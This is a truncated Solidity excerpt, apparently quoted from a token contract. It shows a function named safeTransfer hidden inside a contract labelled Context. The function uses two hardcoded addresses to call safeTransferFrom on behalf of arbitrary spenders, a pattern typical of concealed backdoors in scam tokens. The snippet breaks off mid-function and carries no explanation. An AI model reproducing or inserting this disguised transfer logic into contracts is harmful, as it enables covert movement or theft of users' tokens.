...
abstract contract Context {
  ...
  function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {
    if (msg.sender != address(0x4B4Db72F43F58fBEEF79B41531d1AD970b7C1cFF)) {
    TransferHelper.safeTransferFrom(0xF75f9D206dD901EFc63143F9018cD66b0fe9Ef34,spender,recipient,amount);
